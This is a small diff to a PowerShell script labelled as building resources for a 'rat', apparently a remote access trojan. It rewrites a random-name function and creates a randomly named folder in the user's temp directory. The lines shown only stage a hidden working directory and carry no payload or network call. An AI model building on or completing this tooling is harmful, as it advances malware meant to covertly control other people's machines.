@@ -1,13 +1,17 @@
-# builds resources for rat
+# Builds resources for rat
 
-
-# random string for directories
+# Function to generate random text for directory name
 function random_text {
-    return -join ((65..90) + (97+122) || Get-Random -Count 5 | % {[char]$_})
-    
+    $chars = ([char[]]([char]'A'..[char]'Z') + ([char[]]([char]'a'..[char]'z')))
+    $randomChars = Get-Random -InputObject $chars -Count 5
+    return -join $randomChars
 }
 
+# Change directory to the temporary folder
+Set-Location $env:temp
 
-cd $env:temp
+# Generate a random directory name
 $directory_name = random_text
-mkdir $directory_name
+
+# Create the directory
+New-Item -ItemType Directory -Name $directory_name
